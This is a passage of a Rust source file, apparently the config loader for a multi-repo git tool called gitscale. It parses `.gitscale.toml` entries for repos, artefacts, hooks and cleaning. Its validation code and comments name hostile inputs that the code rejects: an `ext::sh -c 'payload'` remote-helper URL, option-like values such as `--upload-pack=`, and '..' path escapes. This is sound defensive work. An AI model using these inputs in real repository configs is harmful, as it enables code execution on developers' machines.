use anyhow::{bail, Context, Result};
use serde::Deserialize;
use std::collections::BTreeMap;
use std::fmt;
use std::path::{Component, Path, PathBuf};

pub const CONFIG_FILENAME: &str = ".gitscale.toml";

/// How an entry uses the image its repository's pipeline published for a
/// commit: instead of a checkout of the source, or laid over one.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ArtefactUse {
    /// The image's files, all of them, and no checkout.
    Replace,
    /// A source checkout with every image file it does not track laid over
    /// it.
    Overlay,
}

impl fmt::Display for ArtefactUse {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ArtefactUse::Replace => write!(f, "replace"),
            ArtefactUse::Overlay => write!(f, "overlay"),
        }
    }
}

impl ArtefactUse {
    pub fn from_str_checked(s: &str) -> Result<Self> {
        match s {
            "replace" => Ok(ArtefactUse::Replace),
            "overlay" => Ok(ArtefactUse::Overlay),
            _ => bail!(
                "invalid artefact '{}', expected \"replace\" or \"overlay\"",
                s
            ),
        }
    }
}

#[derive(Debug, Clone)]
pub struct RepoEntry {
    pub directory: String,
    pub repo_url: String,
    pub revision: String,
    /// `None` for a plain source checkout.
    pub artefact: Option<ArtefactUse>,
    pub recursive: bool,
    /// `override = true`: exactly this revision and nothing higher. It wins
    /// over every request from a repository the declaring one dominates, and
    /// must agree with the rest — see [`crate::resolution`].
    pub is_override: bool,
    /// `singleton = true` or `false`: whether this repository may be checked
    /// out once per compatibility class (`false`, the default) or only once.
    pub singleton: Option<bool>,
}

impl Default for RepoEntry {
    fn default() -> Self {
        RepoEntry {
            directory: String::new(),
            repo_url: String::new(),
            revision: String::new(),
            artefact: None,
            recursive: true,
            is_override: false,
            singleton: None,
        }
    }
}

impl RepoEntry {
    /// The image instead of a checkout: there is no git repository here.
    pub fn is_artefact(&self) -> bool {
        self.artefact == Some(ArtefactUse::Replace)
    }

    pub fn is_overlay(&self) -> bool {
        self.artefact == Some(ArtefactUse::Overlay)
    }

    /// As `status` shows it: `replace`, `overlay` or `-`.
    pub fn artefact_label(&self) -> String {
        self.artefact
            .map_or_else(|| "-".to_string(), |a| a.to_string())
    }
}

/// What a git-hook-triggered pull should do when it fails.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OnHookError {
    /// Return non-zero, failing the git operation that triggered the hook.
    Fail,
    /// Report on stderr but let the git operation succeed.
    Warn,
}

impl OnHookError {
    /// The spelling `[hooks].on_pull_error` accepts, so a config that is read
    /// and written back keeps the value it had.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Fail => "fail",
            Self::Warn => "warn",
        }
    }

    /// Unconfigured, CI fails fast; interactive use only warns, so a broken
    /// pull cannot make unrelated `git checkout` calls look like failures.
    pub fn resolved(configured: Option<Self>) -> Self {
        configured.unwrap_or(if crate::git::is_ci() {
            Self::Fail
        } else {
            Self::Warn
        })
    }
}

#[derive(Debug, Clone, Default)]
pub struct Hooks {
    pub post_sync: Option<String>,
    pub on_pull_error: Option<OnHookError>,
}

/// `[develop]`: which of the root's branches are built from pins rather than
/// followed as a topic.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Develop {
    /// Branch names or globs (`release/*`). Unset, the root pins only its
    /// default branch; below the root an unset list says nothing.
    pub pinned: Option<Vec<String>>,
}

/// Which untracked files `gitscale clean` keeps.
///
/// Scoped to the repo whose config it appears in, and nothing below it: a
/// sub-repository knows its own build outputs and local scaffolding, so it
/// declares them in its own `.gitscale.toml` rather than having the root
/// enumerate them on its behalf.
#[derive(Debug, Clone, Default)]
pub struct Clean {
    /// gitignore-syntax patterns, anchored at this repo's root. Passed to
    /// `git clean -e` unchanged, so a pattern means exactly what the same
    /// text on a `.gitignore` line would.
    pub exclude: Vec<String>,
    /// How long an artefact image nothing has used is kept in the root's
    /// image store, as written (`3months`). Unset means the default.
    pub keep_recent: Option<String>,
}

/// How long an unused image stays in the root's store when `[clean]
/// keep_recent` does not say.
pub const DEFAULT_KEEP_RECENT: &str = "3months";

/// What `gitscale artefact publish` ships from the repository this config
/// belongs to: the files each group's globs select, one image layer per group.
/// Paths are the repository's own, so an image laid over a checkout of its
/// commit puts every file where the build would have.
///
/// The producer's half of artefacts. A consumer declares an entry with
/// `artefact = "replace"` or `"overlay"` and never reads this table; it lives
/// in the source repository, next to the build that makes the files.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ArtefactSpec {
    /// In the order layers are written. A file goes to the first group that
    /// matches it.
    pub layers: Vec<LayerSpec>,
}

/// The name a single group gets when `[artefact]` lists `include` directly
/// rather than `[[artefact.layer]]` tables.
pub const DEFAULT_LAYER: &str = "default";

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LayerSpec {
    pub name: String,
    pub include: Vec<String>,
    pub exclude: Vec<String>,
}

/// `[resolve]`: where dependencies nobody declared at the root are checked
/// out, and which repositories may arrive that way.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ResolveSettings {
    /// The directory implicit checkouts go in, relative to the config.
    pub hoist_dir: String,
    /// Patterns, in the syntax `hook install --allow` takes, for repositories
    /// an implicit dependency may come from beyond the ones the root's own
    /// entries already allow.
    pub allow: Vec<String>,
}

/// Where implicit checkouts go when `[resolve] hoist_dir` is not set.
pub const DEFAULT_HOIST_DIR: &str = "imports";

impl Default for ResolveSettings {
    fn default() -> Self {
        ResolveSettings {
            hoist_dir: DEFAULT_HOIST_DIR.to_string(),
            allow: Vec::new(),
        }
    }
}

/// `[forward]`: how `git scale <git command>` runs.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Forward {
    /// Run `fetch`, `pull` and `push` in this many repositories at once.
    pub parallel: Option<usize>,
}

/// `[topic]`: how topic branches are named.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct TopicSettings {
    /// Put in front of every topic `git topic start` creates; `{user}` is the
    /// author's name.
    pub prefix: Option<String>,
}

#[derive(Debug, Clone, Default)]
pub struct GitScaleConfig {
    pub repos: Vec<RepoEntry>,
    /// A top-level `singleton = true`: this repository says of itself that a
    /// workspace may hold only one checkout of it.
    pub singleton: bool,
    pub resolve: ResolveSettings,
    /// `[registries]`: where artefacts of a host, or of a repository URL
    /// prefix, are published — for anything the built-in forge mapping
    /// does not cover. See [`crate::registry::image_for`].
    pub registries: BTreeMap<String, String>,
    pub artefact: Option<ArtefactSpec>,
    pub hooks: Hooks,
    pub clean: Clean,
    pub develop: Develop,
    pub forward: Forward,
    pub topic: TopicSettings,
}

#[derive(Deserialize)]
struct RawConfig {
    singleton: Option<bool>,
    resolve: Option<RawResolve>,
    registries: Option<BTreeMap<String, String>>,
    artefact: Option<RawArtefact>,
    repos: Option<BTreeMap<String, RawRepo>>,
    hooks: Option<RawHooks>,
    clean: Option<RawClean>,
    develop: Option<RawDevelop>,
    forward: Option<RawForward>,
    topic: Option<RawTopic>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawForward {
    parallel: Option<i64>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawTopic {
    prefix: Option<String>,
}

// Unknown keys are errors here, unlike the older tables: a misspelt
// `includes` would otherwise publish an artefact missing what it was meant to
// carry, and nothing downstream could tell.
#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawArtefact {
    include: Option<Vec<String>>,
    exclude: Option<Vec<String>>,
    layer: Option<Vec<RawLayer>>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawLayer {
    name: Option<String>,
    include: Option<Vec<String>>,
    exclude: Option<Vec<String>>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawResolve {
    hoist_dir: Option<String>,
    allow: Option<Vec<String>>,
}

#[derive(Deserialize)]
struct RawClean {
    exclude: Option<Vec<String>>,
    keep_recent: Option<String>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawDevelop {
    pinned: Option<Vec<String>>,
}

#[derive(Deserialize)]
struct RawHooks {
    post_sync: Option<String>,
    on_pull_error: Option<String>,
}

#[derive(Deserialize)]
struct RawRepo {
    url: Option<String>,
    revision: Option<String>,
    artefact: Option<String>,
    recursive: Option<bool>,
    #[serde(rename = "override")]
    is_override: Option<bool>,
    singleton: Option<bool>,
}

pub fn find_config(start: Option<&Path>) -> Result<PathBuf> {
    let mut current = match start {
        Some(p) => p.canonicalize().context("cannot resolve start path")?,
        None => std::env::current_dir().context("cannot get current directory")?,
    };
    loop {
        let candidate = current.join(CONFIG_FILENAME);
        if candidate.is_file() {
            return Ok(candidate);
        }
        if !current.pop() {
            break;
        }
    }
    bail!(
        "No {} config found (searched upward from {})",
        CONFIG_FILENAME,
        start.unwrap_or(Path::new(".")).display()
    );
}

pub fn load_config(config_path: &Path) -> Result<GitScaleConfig> {
    let text = std::fs::read_to_string(config_path)
        .with_context(|| format!("cannot read {}", config_path.display()))?;
    parse_config(&text, config_path)
}

/// Read a config from its text. `config_path` names where it came from in
/// every message: a file on disk, or a revision of a dependency's repository.
pub fn parse_config(text: &str, config_path: &Path) -> Result<GitScaleConfig> {
    // The parser's own words, in this message: the CLI prints the outermost
    // error only, and "invalid TOML" alone does not say which key.
    let raw: RawConfig = toml::from_str(text)
        .map_err(|e| anyhow::anyhow!("{}: invalid TOML: {}", config_path.display(), e))?;

    let registries = parse_registries(raw.registries.as_ref(), config_path)?;
    let artefact = parse_artefact(raw.artefact.as_ref(), config_path)?;
    let repos = parse_repos(raw.repos.as_ref(), config_path)?;
    let hooks = parse_hooks(raw.hooks.as_ref(), config_path)?;
    let clean = parse_clean(raw.clean.as_ref(), config_path)?;
    let resolve = parse_resolve(raw.resolve.as_ref(), config_path)?;
    let develop = parse_develop(raw.develop.as_ref(), config_path)?;
    let forward = parse_forward(raw.forward.as_ref(), config_path)?;
    let topic = parse_topic(raw.topic.as_ref(), config_path)?;

    Ok(GitScaleConfig {
        repos,
        singleton: raw.singleton.unwrap_or(false),
        resolve,
        registries,
        artefact,
        hooks,
        clean,
        develop,
        forward,
        topic,
    })
}

/// `[forward]`. `parallel` is a number of repositories, at least one.
fn parse_forward(raw: Option<&RawForward>, config_path: &Path) -> Result<Forward> {
    let Some(forward) = raw else {
        return Ok(Forward::default());
    };
    let parallel = match forward.parallel {
        None => None,
        Some(n) if n >= 1 => Some(n as usize),
        Some(n) => bail!(
            "{}: forward.parallel = {}: give the number of repositories to run at once, at \
             least 1",
            config_path.display(),
            n
        ),
    };
    Ok(Forward { parallel })
}

/// `[topic]`. A prefix is part of a branch name, so it holds nothing git
/// would refuse in one, `{user}` aside.
fn parse_topic(raw: Option<&RawTopic>, config_path: &Path) -> Result<TopicSettings> {
    let Some(topic) = raw else {
        return Ok(TopicSettings::default());
    };
    if let Some(prefix) = &topic.prefix {
        let bad = prefix.is_empty()
            || prefix.starts_with('-')
            || prefix.starts_with('/')
            || prefix.contains("..")
            || prefix
                .chars()
                .any(|c| c.is_whitespace() || c.is_control() || "~^:?*[\\".contains(c));
        if bad {
            bail!(
                "{}: topic.prefix \"{}\" cannot start a branch name",
                config_path.display(),
                prefix
            );
        }
    }
    Ok(TopicSettings {
        prefix: topic.prefix.clone(),
    })
}

/// What a parent reads from a dependency's config: its `[repos]`, whether it
/// is a singleton, and the branches it pins — validated, since they decide
/// what gets cloned — and nothing else. The rest of that file belongs to the
/// dependency used as a workspace of its own, and a table a parent never reads
/// must not be able to break it.
pub fn parse_dependency_config(text: &str, config_path: &Path) -> Result<GitScaleConfig> {
    #[derive(Deserialize)]
    struct Dependency {
        singleton: Option<bool>,
        repos: Option<BTreeMap<String, RawRepo>>,
        develop: Option<RawDevelop>,
    }
    let raw: Dependency = toml::from_str(text)
        .map_err(|e| anyhow::anyhow!("{}: invalid TOML: {}", config_path.display(), e))?;
    Ok(GitScaleConfig {
        repos: parse_repos(raw.repos.as_ref(), config_path)?,
        singleton: raw.singleton.unwrap_or(false),
        develop: parse_develop(raw.develop.as_ref(), config_path)?,
        ..GitScaleConfig::default()
    })
}

pub fn load_config_optional(config_path: &Path) -> Option<GitScaleConfig> {
    if !config_path.is_file() {
        return None;
    }
    load_config(config_path).ok()
}

/// The config of the workspace `start` is in (the current directory when
/// `None`), and the workspace root it lives in — what every multi-repo
/// command starts from.
///
/// The workspace root is the nearest directory above `start` holding a
/// config at the top of a git repository — unless that repository is a
/// child, a checkout gitscale made: a child is never a workspace, so the
/// search goes on up to the root whose stores the child belongs to. See
/// [`find_root`].
pub fn load_workspace(start: Option<&Path>) -> Result<(GitScaleConfig, PathBuf)> {
    let config_root = find_root(start)?;
    let config = load_config(&config_root.join(CONFIG_FILENAME))?;
    Ok((config, config_root))
}

/// The error for a directory in no workspace.
pub const NOT_IN_WORKSPACE: &str = "not inside a GitScale workspace";

/// The workspace root above `start`: see [`load_workspace`].
///
/// A repository is a child when its git common dir is one of a root's
/// stores, `<root common dir>/gitscale/repos/<name>.git`; its workspace is
/// then the repository above it whose common dir is that root's. Anything
/// else with a config at its top — a clone made by hand inside a workspace —
/// is a workspace of its own.
pub fn find_root(start: Option<&Path>) -> Result<PathBuf> {
    let start = match start {
        Some(p) => p
            .canonicalize()
            .with_context(|| format!("cannot resolve start path {}", p.display()))?,
        None => std::env::current_dir().context("cannot get current directory")?,
    };
    // The root common dir a child found on the way up belongs to.
    let mut wanted: Option<PathBuf> = None;
    // A config not at the top of a repository, for the hint.
    let mut stray: Option<PathBuf> = None;
    let mut dir = start.clone();
    loop {
        let has_config = dir.join(CONFIG_FILENAME).is_file();
        let common = if has_config || wanted.is_none() {
            repo_top_common_dir(&dir)
        } else {
            None
        };
        match (&common, &wanted) {
            (Some(common), Some(want)) if has_config && common == want => return Ok(dir),
            (Some(common), None) => match child_of(common) {
                Some(root_common) => wanted = Some(root_common),
                None if has_config => return Ok(dir),
                None => {}
            },
            (None, _) if has_config && stray.is_none() => stray = Some(dir.clone()),
            _ => {}
        }
        if !dir.pop() {
            break;
        }
    }
    match stray {
        Some(dir) => bail!(
            "{}\nhint: {} has a {} but is not the top of a git repository",
            NOT_IN_WORKSPACE,
            dir.display(),
            CONFIG_FILENAME
        ),
        None => bail!("{}", NOT_IN_WORKSPACE),
    }
}

/// The git common dir of the repository whose top is `dir`, canonical;
/// `None` when `dir` is not the top of one.
fn repo_top_common_dir(dir: &Path) -> Option<PathBuf> {
    if !dir.join(".git").exists() || !crate::git::is_repo_root(dir) {
        return None;
    }
    let common = crate::git::common_dir(dir)?;
    Some(common.canonicalize().unwrap_or(common))
}

/// The root common dir whose store `common` is, when it is one:
/// `<root common dir>/gitscale/repos/<name>.git`.
pub fn child_of(common: &Path) -> Option<PathBuf> {
    let name = common.file_name()?.to_string_lossy();
    if !name.ends_with(".git") {
        return None;
    }
    let repos = common.parent()?;
    let gitscale = repos.parent()?;
    (repos.file_name()? == "repos" && gitscale.file_name()? == "gitscale")
        .then(|| gitscale.parent().map(Path::to_path_buf))
        .flatten()
}

/// Whether the repository whose top is `dir` is a child: a checkout of one
/// of a root's stores.
pub fn is_child(dir: &Path) -> bool {
    crate::git::common_dir(dir).is_some_and(|common| child_of(&common).is_some())
}

/// The entries `names` selects: all of them when none are given, otherwise
/// exactly those directories, and an error naming any that are not declared.
pub fn filter_entries(entries: &[RepoEntry], names: &[String]) -> Result<Vec<RepoEntry>> {
    if names.is_empty() {
        return Ok(entries.to_vec());
    }
    let matched: Vec<RepoEntry> = entries
        .iter()
        .filter(|e| names.contains(&e.directory))
        .cloned()
        .collect();
    let matched_names: Vec<&str> = matched.iter().map(|e| e.directory.as_str()).collect();
    let unknown: Vec<&str> = names
        .iter()
        .filter(|n| !matched_names.contains(&n.as_str()))
        .map(|n| n.as_str())
        .collect();
    if !unknown.is_empty() {
        bail!("Unknown repos: {}", unknown.join(", "));
    }
    Ok(matched)
}

// ---------------------------------------------------------------------------
// Validation
//
// `.gitscale.toml` travels inside the repository, so every value below arrives
// from whoever wrote the checked-out branch. These checks exist because git
// treats some strings as instructions rather than data — see also the hook
// allowlist in `crate::trust`, which covers the `[hooks]` table.
// ---------------------------------------------------------------------------

/// The remote-helper prefix of a URL, if it has one.
///
/// `ext::sh -c 'payload'` runs the rest of the string as a command, so a bare
/// repo URL is enough for code execution — no hooks needed. Helper names are
/// bare words, so anything containing a path separator is a URL that merely
/// happens to hold a `::` (an IPv6 literal, say) and is left alone.
fn remote_helper_prefix(url: &str) -> Option<&str> {
    let scheme = &url[..url.find("::")?];
    let bare_word = !scheme.is_empty()
        && scheme
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-'));
    bare_word.then_some(scheme)
}

/// Reject a value git would parse as an option rather than as itself. A URL or
/// revision starting with `-` reaches git as `--upload-pack=…` and similar.
fn check_not_option_like(value: &str, what: &str, config_path: &Path) -> Result<()> {
    if value.starts_with('-') {
        bail!(
            "{}: {} \"{}\" starts with '-', which git would read as a command-line option",
            config_path.display(),
            what,
            value
        );
    }
    Ok(())
}

fn check_url(url: &str, what: &str, config_path: &Path) -> Result<()> {
    check_not_option_like(url, what, config_path)?;
    if let Some(helper) = remote_helper_prefix(url) {
        bail!(
            "{}: {} \"{}\" uses the '{}::' remote helper, which gitscale refuses to run \
             (a helper such as 'ext::' executes the rest of the URL as a command)",
            config_path.display(),
            what,
            url,
            helper
        );
    }
    Ok(())
}

/// A checkout directory must stay inside the workspace: the config decides
/// where clones land, and `../..` would let it write anywhere the user can.
fn check_directory(directory: &str, config_path: &Path) -> Result<()> {
    let path = Path::new(directory);
    if directory.is_empty() {
        bail!(
            "{}: a repo directory cannot be empty",
            config_path.display()
        );
    }
    if path.is_absolute() {
        bail!(
            "{}: repo directory \"{}\" must be relative to the config, not absolute",
            config_path.display(),
            directory
        );
    }
    if path.components().any(|c| c == Component::ParentDir) {
        bail!(
            "{}: repo directory \"{}\" escapes the workspace with '..'",
            config_path.display(),
            directory
        );
    }
    Ok(())
}

/// Everything a `[repos]` entry is held to, whether it is read from the
/// config or about to be written into it by `gitscale add`.
pub fn check_entry(directory: &str, url: &str, revision: &str, config_path: &Path) -> Result<()> {
    check_directory(directory, config_path)?;
    if url.is_empty() {
        bail!(
            "{}: repos.{}.url is required",
            config_path.display(),
            directory
        );
    }
    check_url(url, &format!("repos.{}.url", directory), config_path)?;
    check_not_option_like(
        revision,
        &format!("repos.{}.revision", directory),
        config_path,
    )
}

/// `[registries]`.
fn parse_registries(
    raw: Option<&BTreeMap<String, String>>,
    config_path: &Path,
) -> Result<BTreeMap<String, String>> {
    let registries = raw.cloned().unwrap_or_default();
    for (key, registry) in &registries {
        if key.is_empty() || registry.is_empty() {
            bail!(
                "{}: registries entries need a host or URL prefix and a registry",
                config_path.display()
            );
        }
        // `http://` is the one scheme accepted: an explicit opt-in to plain
        // HTTP, for a registry without TLS on a private network.
        if registry.trim_start_matches("http://").contains("://") {
            bail!(
                "{}: registries.\"{}\" = \"{}\": give the registry as host[:port][/namespace], \
                 with no scheme — or http:// in front for a registry without TLS",
                config_path.display(),
                key,
                registry
            );
        }
    }
    Ok(registries)
}

/// `[artefact]`: the groups `artefact publish` packs. Patterns are checked
/// here, so a broken one is reported when the config is read rather than half
/// way through a publish.
fn parse_artefact(raw: Option<&RawArtefact>, config_path: &Path) -> Result<Option<ArtefactSpec>> {
    let Some(artefact) = raw else {
        return Ok(None);
    };
    let at = |what: &str| format!("{}: artefact{}", config_path.display(), what);

    if artefact.layer.is_some() && (artefact.include.is_some() || artefact.exclude.is_some()) {
        bail!(
            "{}: use include and exclude directly in [artefact] for a single group, or \
             [[artefact.layer]] tables with their own include and exclude — not both",
            at("")
        );
    }
    let layers = match (&artefact.layer, &artefact.include) {
        (Some(layers), _) => layers
            .iter()
            .map(|layer| LayerSpec {
                name: layer.name.clone().unwrap_or_default(),
                include: layer.include.clone().unwrap_or_default(),
                exclude: layer.exclude.clone().unwrap_or_default(),
            })
            .collect::<Vec<_>>(),
        (None, Some(include)) => vec![LayerSpec {
            name: DEFAULT_LAYER.to_string(),
            include: include.clone(),
            exclude: artefact.exclude.clone().unwrap_or_default(),
        }],
        (None, None) => bail!(
            "{}: says nothing to publish; give include = [...] or [[artefact.layer]] tables",
            at("")
        ),
    };

    let mut seen = std::collections::HashSet::new();
    for layer in &layers {
        if layer.name.is_empty()
            || !layer
                .name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
        {
            bail!(
                "{}: layer name \"{}\" must be non-empty letters, digits, '.', '_' or '-'",
                at(""),
                layer.name
            );
        }
        if layer.name == crate::artefact::CONFIG_LAYER {
            bail!(
                "{}: layer name \"{}\" is reserved: publish adds that layer itself, to carry \
                 the repository's {}",
                at(""),
                layer.name,
                CONFIG_FILENAME
            );
        }
        if !seen.insert(layer.name.as_str()) {
            bail!("{}: layer name \"{}\" is used twice", at(""), layer.name);
        }
        if layer.include.is_empty() {
            bail!("{}: layer \"{}\" includes nothing", at(""), layer.name);
        }
        for pattern in layer.include.iter().chain(&layer.exclude) {
            crate::artefact::check_pattern(pattern)
                .with_context(|| format!("{}: layer \"{}\"", at(""), layer.name))?;
        }
    }
    Ok(Some(ArtefactSpec { layers }))
}

/// A path that must stay below the directory it is relative to.
fn check_relative(path: &str) -> Result<()> {
    let p = Path::new(path);
    if path.is_empty() || p.is_absolute() {
        bail!("\"{}\" must be a relative path", path);
    }
    if p.components().any(|c| c == Component::ParentDir) {
        bail!("\"{}\" must not leave its directory with '..'", path);
    }
    Ok(())
}

/// `[clean] exclude`. Patterns reach `git clean -e` as arguments, so one
/// starting with `-` would arrive as a flag rather than as a pattern — the
/// same hazard `check_not_option_like` covers for URLs and revisions.
fn parse_clean(raw: Option<&RawClean>, config_path: &Path) -> Result<Clean> {
    let Some(clean) = raw else {
        return Ok(Clean::default());
    };
    let exclude = clean.exclude.clone().unwrap_or_default();
    for pattern in &exclude {
        if pattern.is_empty() {
            bail!(
                "{}: clean.exclude contains an empty pattern",
                config_path.display()
            );
        }
        check_not_option_like(pattern, "clean.exclude entry", config_path)?;
    }
    if let Some(period) = &clean.keep_recent {
        crate::cache::parse_period(period)
            .with_context(|| format!("{}: clean.keep_recent", config_path.display()))?;
    }
    Ok(Clean {
        exclude,
        keep_recent: clean.keep_recent.clone(),
    })
}

/// `[develop]`. A pinned branch is a name or a glob, matched against branch
/// names as `release/*` would be.
fn parse_develop(raw: Option<&RawDevelop>, config_path: &Path) -> Result<Develop> {
    let Some(develop) = raw else {
        return Ok(Develop::default());
    };
    if let Some(pinned) = &develop.pinned {
        if pinned.iter().any(|b| b.trim().is_empty()) {
            bail!(
                "{}: develop.pinned contains an empty branch name",
                config_path.display()
            );
        }
    }
    Ok(Develop {
        pinned: develop.pinned.clone(),
    })
}

fn parse_repos(
    raw: Option<&BTreeMap<String, RawRepo>>,
    config_path: &Path,
) -> Result<Vec<RepoEntry>> {
    let Some(repos) = raw else {
        return Ok(Vec::new());
    };
    let mut entries = Vec::new();
    for (directory, spec) in repos {
        let url = spec.url.as_deref().unwrap_or_default();
        let revision = spec.revision.clone().unwrap_or_default();
        check_entry(directory, url, &revision, config_path)?;

        let artefact = match &spec.artefact {
            Some(a) => Some(ArtefactUse::from_str_checked(a).with_context(|| {
                format!("{}: repos.{}.artefact", config_path.display(), directory)
            })?),
            None => None,
        };

        let recursive = spec.recursive.unwrap_or(true);
        let is_override = spec.is_override.unwrap_or(false);
        if is_override && revision.is_empty() {
            bail!(
                "{}: repos.{} sets override = true without a revision; an override names \
                 the exact revision to hold the dependency at",
                config_path.display(),
                directory
            );
        }

        entries.push(RepoEntry {
            directory: directory.clone(),
            repo_url: url.to_string(),
            revision,
            artefact,
            recursive,
            is_override,
            singleton: spec.singleton,
        });
    }
    check_unambiguous(&entries, config_path)?;
    Ok(entries)
}

/// Two entries for one repository need revisions to tell which checkout is
/// which: without them, nothing says which major each one is for.
fn check_unambiguous(entries: &[RepoEntry], config_path: &Path) -> Result<()> {
    for (i, a) in entries.iter().enumerate() {
        for b in &entries[i + 1..] {
            if a.revision.is_empty()
                && b.revision.is_empty()
                && a.is_artefact() == b.is_artefact()
                && crate::urls::normalize(&a.repo_url) == crate::urls::normalize(&b.repo_url)
            {
                bail!(
                    "{}: repos.{} and repos.{} are the same repository with no revision \
                     to tell their checkouts apart; give each a revision",
                    config_path.display(),
                    a.directory,
                    b.directory
                );
            }
        }
    }
    Ok(())
}

/// `[resolve]`. The hoist directory must stay inside the workspace, like any
/// checkout directory.
fn parse_resolve(raw: Option<&RawResolve>, config_path: &Path) -> Result<ResolveSettings> {
    let Some(resolve) = raw else {
        return Ok(ResolveSettings::default());
    };
    let hoist_dir = resolve
        .hoist_dir
        .clone()
        .unwrap_or_else(|| DEFAULT_HOIST_DIR.to_string());
    check_relative(&hoist_dir)
        .with_context(|| format!("{}: resolve.hoist_dir", config_path.display()))?;
    let allow: Vec<String> = resolve
        .allow
        .iter()
        .flatten()
        .map(|p| p.trim().to_lowercase())
        .collect();
    if allow.iter().any(String::is_empty) {
        bail!(
            "{}: resolve.allow contains an empty pattern",
            config_path.display()
        );
    }
    Ok(ResolveSettings { hoist_dir, allow })
}

fn parse_hooks(raw: Option<&RawHooks>, config_path: &Path) -> Result<Hooks> {
    let Some(hooks) = raw else {
        return Ok(Hooks::default());
    };
    let on_pull_error = match hooks.on_pull_error.as_deref() {
        None => None,
        Some("fail") => Some(OnHookError::Fail),
        Some("warn") => Some(OnHookError::Warn),
        Some(other) => bail!(
            "{}: invalid hooks.on_pull_error '{}' (expected \"fail\" or \"warn\")",
            config_path.display(),
            other
        ),
    };
    Ok(Hooks {
        post_sync: hooks.post_sync.clone(),
        on_pull_error,
    })
}

/// Set the `revision` of each `(directory, revision)` entry of the config at
/// `path` in place, leaving every comment, key order and table gitscale does
/// not know about as it was — unlike [`write_config`], which rewrites the
/// file. An entry without a `revision` key gets one.
pub fn set_revisions(path: &Path, changes: &[(String, String)]) -> Result<()> {
    let text =
        std::fs::read_to_string(path).with_context(|| format!("cannot read {}", path.display()))?;
    let mut doc: toml_edit::DocumentMut = text
        .parse()
        .with_context(|| format!("{}: invalid TOML", path.display()))?;
    for (directory, revision) in changes {
        let entry = doc
            .get_mut("repos")
            .and_then(|repos| repos.get_mut(directory))
            .with_context(|| format!("{}: no entry repos.{}", path.display(), directory))?;
        let value = if let Some(table) = entry.as_inline_table_mut() {
            table.get_mut("revision")
        } else if let Some(table) = entry.as_table_mut() {
            table
                .get_mut("revision")
                .and_then(|item| item.as_value_mut())
        } else {
            bail!(
                "{}: repos.{} is neither a table nor an inline table",
                path.display(),
                directory
            );
        };
        match value {
            Some(value) => {
                let decor = value.decor().clone();
                *value = toml_edit::Value::from(revision.as_str());
                *value.decor_mut() = decor;
            }
            None => match entry.as_inline_table_mut() {
                Some(table) => {
                    table.insert("revision", toml_edit::Value::from(revision.as_str()));
                }
                None => {
                    if let Some(table) = entry.as_table_mut() {
                        table.insert("revision", toml_edit::value(revision.as_str()));
                    }
                }
            },
        }
    }
    std::fs::write(path, doc.to_string())
        .with_context(|| format!("cannot write {}", path.display()))
}

/// Add `entry` to the `[repos]` of the config at `path` in place, creating
/// the file, or the table, when there is none. Comments, key order and
/// tables gitscale does not know about are kept.
pub fn add_entry(path: &Path, entry: &RepoEntry) -> Result<()> {
    let text = if path.is_file() {
        std::fs::read_to_string(path).with_context(|| format!("cannot read {}", path.display()))?
    } else {
        String::new()
    };
    let mut doc: toml_edit::DocumentMut = text
        .parse()
        .with_context(|| format!("{}: invalid TOML", path.display()))?;
    let mut value = toml_edit::InlineTable::new();
    value.insert("url", entry.repo_url.as_str().into());
    if !entry.revision.is_empty() {
        value.insert("revision", entry.revision.as_str().into());
    }
    if let Some(artefact) = entry.artefact {
        value.insert("artefact", artefact.to_string().into());
    }
    if !doc.contains_key("repos") {
        doc.insert("repos", toml_edit::Item::Table(toml_edit::Table::new()));
    }
    let repos = doc.get_mut("repos").expect("inserted above");
    if let Some(table) = repos.as_table_mut() {
        table.insert(&entry.directory, toml_edit::value(value));
    } else if let Some(table) = repos.as_inline_table_mut() {
        table.insert(&entry.directory, toml_edit::Value::InlineTable(value));
    } else {
        bail!("{}: repos is not a table", path.display());
    }
    std::fs::write(path, doc.to_string())
        .with_context(|| format!("cannot write {}", path.display()))
}

/// Remove `directory` from the `[repos]` of the config at `path` in place.
/// `Ok(false)` when it is not there.
pub fn remove_entry(path: &Path, directory: &str) -> Result<bool> {
    let text =
        std::fs::read_to_string(path).with_context(|| format!("cannot read {}", path.display()))?;
    let mut doc: toml_edit::DocumentMut = text
        .parse()
        .with_context(|| format!("{}: invalid TOML", path.display()))?;
    let Some(repos) = doc.get_mut("repos") else {
        return Ok(false);
    };
    let removed = if let Some(table) = repos.as_table_like_mut() {
        table.remove(directory).is_some()
    } else {
        false
    };
    if removed {
        std::fs::write(path, doc.to_string())
            .with_context(|| format!("cannot write {}", path.display()))?;
    }
    Ok(removed)
}

/// Render a value as a TOML basic string.
///
/// Nothing here is validated against quoting: a `post_sync` command is an
/// arbitrary shell line, and `check_url` rejects option-like and remote-helper
/// URLs without caring about quotes. Emitting any of them raw would produce a
/// file that no longer parses — silently losing the rest of the config on the
/// next read.
fn toml_string(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('"');
    for c in value.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\u{8}' => out.push_str("\\b"),
            '\u{c}' => out.push_str("\\f"),
            // Remaining control characters have no short escape and are
            // illegal bare in a basic string.
            c if (c as u32) < 0x20 || c == '\u{7f}' => {
                out.push_str(&format!("\\u{:04X}", c as u32))
            }
            c => out.push(c),
        }
    }
